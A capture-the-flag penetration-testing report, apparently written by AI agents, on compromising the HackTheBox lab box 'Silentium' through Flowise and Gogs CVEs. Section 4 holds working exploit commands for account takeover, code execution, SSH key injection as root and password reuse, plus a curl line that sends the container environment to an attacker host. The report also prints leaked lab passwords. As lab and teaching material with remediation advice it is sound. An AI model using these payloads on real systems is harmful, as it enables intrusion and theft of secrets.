# Penetration Testing Report — HTB "Silentium" (Easy, Linux)

**Target:** silentium.htb — IP `$TARGET`
**Engagement date:** 2026-10-03
**Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no environment-specific IPs or local paths are hardcoded.*
**Result:** Full compromise — unauthenticated account takeover escalated to `root` via injected SSH key.
Both flags captured.

---

## 1. Executive Summary

Silentium is an "easy"-rated Ubuntu 24.04 Linux box compromised by chaining two Flowise CVEs, credential
reuse from leaked container environment variables, and an arbitrary-file-write CVE in a root-run Gogs
instance. Beyond the static marketing site (which names a staff member "Ben"), two app vhosts drive the
attack: `staging.silentium.htb` (**Flowise 3.0.5**) and the internally-discovered
`staging-v2-code.dev.silentium.htb` (**Gogs 0.13.3, running as `root`**).

Flowise 3.0.5 is vulnerable to **CVE-2025-58434**, whose forgot-password endpoint returns a password-reset
`tempToken` in the unauthenticated response body. Using the site-sourced username `ben@silentium.htb`, this
allows an **unauthenticated account takeover** (reset the password, log in — the account is an
organization admin). As an authenticated Flowise admin, **CVE-2025-59528** (CustomMCP node RCE — attacker
`mcpServerConfig` flows into a JS `Function()` constructor) yields code execution as `root` inside the
Flowise Docker container. The container's environment variables leak credentials, including
`SMTP_PASSWORD=r04D!!_R4ge`, which is **reused as the host SSH password for user `ben`** (uid 1000) — the
foothold and `user.txt`.

`ben` has no sudo and a clean local checklist; the escalation is the operator-hinted Gogs chain. Reading
nginx configs on the host reveals the Gogs vhost (reverse-proxied to `127.0.0.1:3001`), running natively
as `root`. **CVE-2025-8110** (Gogs ≤0.13.3 PutContents symlink-traversal arbitrary file write) is exploited
by a self-registered Gogs account: commit a symlink pointing at `/root/.ssh/authorized_keys`, then call the
contents API on that symlink name — Gogs follows the link and writes the attacker SSH public key as root.
SSH as root yields `root.txt`. The recurring root cause: a token leaked in an API response, secrets in
reusable environment variables, and a service running as root that trusts attacker-controlled paths.

---

## 2. Attack Chain Timeline

1. `nmap -p- -sCV` — only 22 (OpenSSH 9.6p1) and 80 (nginx 1.24.0). *Result:* web is the only surface.
2. `silentium.htb` names staff incl. "Ben — Head of Financial Systems" → candidate username. Targeted vhost
   guess → `staging.silentium.htb` = **Flowise 3.0.5** (`/api/v1/version` → `3.0.5`). *Result:* app target.
3. **CVE-2025-58434** account takeover: `POST /api/v1/account/forgot-password {"user":{"email":
   "ben@silentium.htb"}}` → 201 with `user.tempToken` in body; `POST /api/v1/account/reset-password` with
   that token sets a new password; `POST /api/v1/auth/login` returns session cookies. Account is org admin.
   *Result:* authenticated Flowise admin (no prior creds).
4. **CVE-2025-59528** RCE: `POST /api/v1/node-load-method/customMCP` with a `mcpServerConfig` payload that
   reaches `Function()` → `child_process` exec as `uid=0(root)` inside container `c78c3cceb7ba`. Output is
   not echoed, so command results are exfiltrated out-of-band to an attacker HTTP listener. *Result:*
   container RCE.
5. Dumped container `env` → `FLOWISE_USERNAME/PASSWORD`, `JWT_AUTH_TOKEN_SECRET`, and
   `SMTP_PASSWORD=r04D!!_R4ge`. *Result:* candidate credentials.
6. Credential reuse — `SMTP_PASSWORD` authenticates `ben` over host SSH (uid 1000); `FLOWISE_PASSWORD`
   does **not** work for SSH. *Result:* interactive host foothold; **user.txt captured.**
7. Local enum as ben — no sudo at all; stock SUID/SGID/caps/cron; not in `docker` group. `ss -tlnp` shows
   `127.0.0.1:3001`. Reading `/etc/nginx/sites-available/staging-v2-code` reveals vhost
   `staging-v2-code.dev.silentium.htb` → `proxy_pass 127.0.0.1:3001`. *Result:* hidden Gogs vhost found.
8. `ps aux` → `root … /opt/gogs/gogs/gogs web`; `gogs --version` → 0.13.3; `app.ini` `RUN_USER=root`,
   `DISABLE_REGISTRATION=false`. Added the vhost to attacker `/etc/hosts` (reachable on public port 80).
   *Result:* root-run Gogs 0.13.3, open registration — CVE-2025-8110 target.
9. `ben` has no Gogs account; self-registered `pwnagent` (captcha solved by visual inspection), created an
   API token. *Result:* authenticated Gogs access.
10. **CVE-2025-8110** PoC: create repo, commit a symlink `payload → /root/.ssh/authorized_keys`, then
    `PUT /api/v1/repos/pwnagent/<repo>/contents/payload` with base64 of the attacker SSH pubkey. Gogs
    resolves the symlink and writes the key as root. *Result:* `[+] Write OK`.
11. `ssh -i loot/silentium_root_key root@…` → `uid=0(root)`. *Result:* **root.txt captured** — box owned.

---

## 3. Key Vulnerabilities Identified

### 3.1 Flowise account takeover via leaked reset token (CVE-2025-58434)
- **Description:** Flowise ≤3.0.5's `forgot-password` endpoint returns the password-reset `tempToken` in the
  unauthenticated API response, allowing anyone who knows a user's email to reset that user's password and
  log in. (Fixed in 3.0.6, which removes the token from the response.)
- **Affected component:** Flowise 3.0.5 on `staging.silentium.htb`.
- **Impact:** Unauthenticated takeover of any known account, here an organization-admin account.
- **Estimated CVSS:** 9.1 (Critical) [estimate] — unauthenticated, network, high C/I impact.
- **Remediation:** Upgrade to Flowise ≥3.0.6; never return reset tokens in responses — deliver them only
  out-of-band (email); invalidate tokens on use and expire them quickly.

### 3.2 Flowise CustomMCP node RCE (CVE-2025-59528)
- **Description:** The CustomMCP node's `convertToValidJSONString` passes attacker-supplied
  `mcpServerConfig` into a JavaScript `Function()` constructor, giving arbitrary Node.js code execution
  (incl. `child_process`). Reachable at `POST /api/v1/node-load-method/customMCP` with an authenticated
  session.
- **Affected component:** Flowise (≥2.2.7-patch.1, <3.0.6); runs as root inside its Docker container.
- **Impact:** Authenticated remote code execution as root within the container.
- **Estimated CVSS:** 8.8 (High) [estimate] — authenticated, low complexity, full CIA impact (container).
- **Remediation:** Upgrade to ≥3.0.6; never pass user input to `Function()`/`eval`; sandbox or remove
  dynamic node evaluation; run the service as a non-root container user.

### 3.3 Secrets in container environment reused for host SSH
- **Description:** The Flowise container's env vars expose multiple credentials; `SMTP_PASSWORD`
  (`r04D!!_R4ge`) is reused as the host SSH password for `ben`, bridging container RCE to a host shell.
- **Affected component:** Container env configuration / credential hygiene.
- **Impact:** Container compromise → interactive host foothold.
- **Estimated CVSS:** 7.0 (High) [estimate] — contributes materially to the chain.
- **Remediation:** Do not store reusable secrets in environment variables; use a secrets manager; unique
  credentials per service/account; rotate the exposed password.

### 3.4 Gogs arbitrary file write via symlink traversal (CVE-2025-8110), service running as root
- **Description:** Gogs ≤0.13.3's `PUT …/contents/:path` validates the path string for `../` but does not
  resolve symlinks before writing. An authenticated user can commit a symlink to any filesystem path and
  then write through it, overwriting the target as the Gogs process user. Here Gogs runs as **root**, so
  the attacker writes `/root/.ssh/authorized_keys`.
- **Affected component:** Gogs 0.13.3 (`staging-v2-code.dev.silentium.htb`, `RUN_USER=root`), open
  registration enabled.
- **Impact:** Authenticated arbitrary file write as root → full host compromise.
- **Estimated CVSS:** 8.8 (High) [estimate] — low-priv authenticated, full compromise.
- **Remediation:** Upgrade Gogs; resolve/realpath symlinks and confine writes to the repo tree; never run
  Gogs as root (use a dedicated `git` user); disable open registration on internal instances.

---

## 4. Command Log & Proof of Concepts

All commands were run against the lab target only, from the engagement workstation on `tun0` (HTB VPN).

### 4.1 Recon + vhosts
```bash
nmap -p- -sCV -oN nmap/services.txt $TARGET
echo "$TARGET silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
curl -s http://staging.silentium.htb/api/v1/version    # {"version":"3.0.5"}
```

### 4.2 Foothold step 1 — CVE-2025-58434 Flowise account takeover
```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb"}}'   # -> 201 {..."tempToken":"<t>"}
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' -d '{"user":{"email":"ben@silentium.htb","tempToken":"<t>","password":"Pwned123!"}}'
curl -s -c flowise_cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' -d '{"email":"ben@silentium.htb","password":"Pwned123!"}'   # -> 200 + cookies
```

### 4.3 Foothold step 2 — CVE-2025-59528 CustomMCP RCE (out-of-band exfil)
```bash
# POST /api/v1/node-load-method/customMCP with mcpServerConfig reaching Function();
# command appends | base64 -w0 then curls output to attacker listener (response body never echoes stdout):
python3 -m http.server 8000 --bind $ATTACKER_IP    # attacker listener; read results from access log
# payload runs e.g.: env | base64 -w0 ; curl http://$ATTACKER_IP:8000/$(...)
# -> leaks SMTP_PASSWORD=r04D!!_R4ge  (uid=0(root) inside container c78c3cceb7ba)
```

### 4.4 Lateral — SMTP password reuse to host SSH
```bash
sshpass -p 'r04D!!_R4ge' ssh ben@$TARGET 'id; cat ~/user.txt'    # uid=1000(ben)
```
Flag capture: `/home/ben/user.txt` = `[REDACTED-HTB-FLAG]`.

### 4.5 Privilege escalation — CVE-2025-8110 Gogs symlink file write
```bash
# on host as ben: discover the Gogs vhost + that it runs as root
cat /etc/nginx/sites-available/staging-v2-code       # proxy_pass http://127.0.0.1:3001 (staging-v2-code.dev.silentium.htb)
ps aux | grep gogs                                   # root ... /opt/gogs/gogs/gogs web
# on attacker Kali:
echo "$TARGET staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
ssh-keygen -t ed25519 -f loot/silentium_root_key -N ""
# self-register a Gogs account (open registration; captcha solved by visual inspection) -> pwnagent:Pwnage123!
git clone https://github.com/3jee/CVE-2025-8110 /tmp/CVE-2025-8110
python3 /tmp/CVE-2025-8110/CVE-2025-8110.py --url http://staging-v2-code.dev.silentium.htb \
  -u pwnagent -p 'Pwnage123!' --target-file /root/.ssh/authorized_keys \
  --content-file loot/silentium_root_key.pub          # -> [+] Write OK
ssh -i loot/silentium_root_key root@$TARGET 'id; cat /root/root.txt'   # uid=0(root)
```
Flag capture: `/root/root.txt` = `[REDACTED-HTB-FLAG]` (loot/root.txt).

---

## 5. Both Flags

| Flag | Value | Location | Notes |
|---|---|---|---|
| user.txt | `[REDACTED-HTB-FLAG]` | `/home/ben/user.txt` | Captured as `ben` via SSH (SMTP password reuse). |
| root.txt | `[REDACTED-HTB-FLAG]` | `/root/root.txt` | Captured via CVE-2025-8110 → injected root SSH key. |

---

## 6. Credentials & Artifacts

| Principal | Secret | Source | Scope |
|---|---|---|---|
| Flowise `ben@silentium.htb` | `Pwned123!` (reset) | CVE-2025-58434 takeover | Flowise org admin. |
| Flowise app | `FLOWISE_USERNAME=ben` / `F1l3_d0ck3r` | Container env | Flowise basic-auth only (**not** SSH). |
| `ben` (OS) | `r04D!!_R4ge` (SMTP_PASSWORD) | Container env, reused | Host SSH, uid 1000. |
| Gogs `pwnagent` | `Pwnage123!` (+ API token `70eab2df…`) | Self-registered (open registration) | Gogs API (throwaway). |
| `root` (OS) | injected `ed25519` key | CVE-2025-8110 file write | `loot/silentium_root_key` / `.pub`. |

---

## 7. Cleanup / Artifacts Left on Target

- Attacker SSH key appended to `/root/.ssh/authorized_keys` — **remove** the injected line.
- Throwaway Gogs account `pwnagent` + its repo and API token — **delete.**
- Flowise `ben` password was changed to `Pwned123!` during takeover — **restore/rotate.**
- Note: Flowise container RCE is ephemeral (container filesystem); nothing persistent written there.

---

## 8. Open Items / [needs verification]

- None for compromise — box fully owned, both flags captured, root SSH verified.
- MailHog (`127.0.0.1:8025`/`:1025`) and an ephemeral `127.0.0.1:38733` listener were observed but not
  pursued (root achieved via Gogs); noted for completeness.

---

*Companion documents: `walkthrough.md` — step-by-step reproduction; `STORY.md` — plain-language
narrative; `GLOBAL_CONTEXT.md` — the engagement blackboard and evidence trail.*
